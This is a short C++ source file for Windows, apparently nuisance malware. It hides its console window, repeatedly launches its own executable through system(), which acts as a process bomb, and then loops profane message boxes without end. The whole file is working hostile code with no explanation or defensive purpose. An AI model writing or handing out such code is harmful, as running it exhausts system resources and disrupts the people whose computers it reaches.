#include<windows.h>
#include<cstring>
#include<iostream>
using namespace std;
int main(){
	HWND hwnd;
	hwnd=FindWindow("ConsoleWindowClass",NULL);	
    char path[1000];
    GetModuleFileName(NULL, path, 1000);
	ShowWindow(hwnd,SW_HIDE);
	system(path);
	while(true) MessageBox(NULL,"There is nothing right, just f@ck you computer","F@CK",MB_OK);
	return 0;
}
